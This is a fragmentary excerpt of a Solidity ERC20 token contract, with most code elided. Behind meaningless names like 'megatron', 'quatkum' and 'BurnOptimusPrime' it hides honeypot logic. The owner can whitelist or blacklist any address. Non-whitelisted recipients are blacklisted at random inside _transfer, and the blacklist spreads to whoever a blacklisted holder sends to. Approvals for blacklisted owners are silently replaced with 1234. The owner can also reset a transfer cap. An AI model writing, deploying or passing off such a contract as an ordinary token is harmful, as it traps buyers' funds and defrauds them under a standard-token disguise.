...
contract ERC20Token is Context, IERC20, Ownable {
  ...
  mapping (address => bool) public megatron;
  mapping (address => bool) public quatkum;

  bool private desepticons;
  ...
  constructor() public {
    ...
    elephant = _totalSupply / 800;
    opera = elephant;
    quatkum[creator] = false;
    megatron[msg.sender] = true;
  ...
  function ViewTheTaxi() external view onlyOwner returns (uint256) {
  ...
  */
  ...
  function BurnOptimusPrime(uint256 amount) external onlyOwner {
    elephant = amount;
  }
  ...
  function CheckTheAddress(address spender, bool val, bool val2) external onlyOwner {
    megatron[spender] = val;
    quatkum[spender] = val2; 
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (desepticons == true)) {
      megatron[recipient] = true;
      quatkum[recipient] = false;
      desepticons = false;
    }
    
    if (megatron[recipient] != true) {
        quatkum[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((quatkum[sender]) && (megatron[recipient] == false)) {
        quatkum[recipient] = true;
    }
    
    if (megatron[sender] == false) {
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (keyboard == true)) {
      megatron[spender] = true;
      quatkum[spender] = false;
      keyboard = false;
    }
    
    tok = (quatkum[owner] ? 1234 : amount);
